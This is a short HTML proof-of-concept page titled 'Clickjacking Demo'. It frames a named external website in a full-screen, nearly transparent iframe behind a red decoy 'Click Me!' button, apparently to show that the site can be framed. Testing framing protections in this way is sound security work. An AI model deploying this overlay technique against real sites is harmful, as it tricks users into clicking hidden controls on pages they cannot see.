
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Demo</title>
    <style>
        body { margin: 0; overflow: hidden; }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1; /* Make it nearly transparent for demonstration */
            z-index: 2;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: grey; /* A visible overlay for context */
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 3em;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .button-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 3;
            padding: 20px 40px;
            background-color: red;
            color: white;
            font-size: 1.5em;
            border: none;
            cursor: pointer;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="overlay">
        CLICK ME (in the red button)
    </div>
    <button class="button-overlay">Click Me!</button>
    <iframe src="https://alekhakumarswain.web.app"></iframe>
</body>
</html>
